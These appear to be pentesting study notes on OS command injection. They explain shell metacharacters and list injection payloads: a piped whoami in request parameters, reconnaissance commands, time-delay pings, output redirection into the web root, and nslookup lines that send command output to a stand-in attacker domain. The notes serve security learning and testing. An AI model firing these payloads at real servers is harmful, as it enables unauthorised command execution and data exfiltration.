## OS command injection

## Introduction
OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data. Very often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, exploiting trust relationships to pivot the attack to other systems within the organization.
## Pre-Requirements 
1. **Wildcards**:
    
    - `*` (Asterisk): Matches any sequence of characters.
    - `?` (Question Mark): Matches any single character.
    - `[]` (Square Brackets): Defines a character class for matching a single character from a specified set or range. For example, `[a-zA-Z]` matches any single alphabetic character.
2. **Redirection**:
    
    - `>` (Greater Than): Redirects the standard output of a command to a file, overwriting its contents if it exists.
    - `>>` (Double Greater Than): Redirects the standard output of a command to a file, appending to the end of the file if it exists.
    - `<` (Less Than): Redirects the standard input of a command from a file.
    - `|` (Pipe): Redirects the standard output of one command to the standard input of another.
3. **Command Substitution**:
    
    - `` ` `` (Backticks): Executes a command within backticks and substitutes its output.
    - `$()` (Dollar Parentheses): Similar to backticks, it executes a command and substitutes its output.
4. **Escape Characters**:
    
    - `\` (Backslash): Escapes the next character, disabling its special meaning. For example, `\n` represents a newline character.
5. **Quoting**:
    
    - `"` (Double Quotes): Preserve the literal value of all characters within the quotes, except for variables and backticks, which are still evaluated.
    - `'` (Single Quotes): Preserve the literal value of all characters within the quotes, including variables and backticks.
6. **Variable Expansion**:
    
    - `$` (Dollar Sign): Indicates variable expansion. For example, `$var` refers to the value of the variable `var`.
7. **Logical Operators**:
    
    - `&&` (Logical AND): Used to combine two commands, executing the second only if the first succeeds.
    - `||` (Logical OR): Used to combine two commands, executing the second only if the first fails.
8. **Other Special Characters**:
    
    - `;` (Semicolon): Separates multiple commands on a single line.
    - `&` (Ampersand): Runs a command in the background.
    - `#` (Hash or Pound Sign): Denotes a comment in shell scripts.
## Where to find ?
- everywhere, use burp active scan 
```
productId=4&storeId=1|whoami => u can fuzz the | for other shell meta chars
```
- u just don't know where the Web server interacts with the OS, so fuzzzzzzz

## How to Exploit ? 
### In-Band 
- use the below commands with shell meta chars 

| purpose of command   | Linux       | Windows      |
| -------------------- | ----------- | ------------ |
| Name of current user | whoami      | whoami       |
| OS                   | uname -a    | ver          |
| Network Conf         | ifconfig    | ipconfig/all |
| Network Connections  | netstat -an | netstat -an  |
| Running process      | ps -ef      | tasklist             |

###  Blind and Out-Of-Band 
- Detecting blind OS command injection using time delays
```
& ping -c 10 127.0.0.1 &
```
- Exploiting blind OS command injection by redirecting output
```
& whoami > /var/www/static/whoami.txt &
=> https://vulnerable-website.com/whoami.txt
```
---
- Detect OAST
```
& nslookup kgji2ohoyw.web-attacker.com &
```
- Exploit OAST
```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```
---
- some tips 
```
;
Newline (0x0a or \n)
```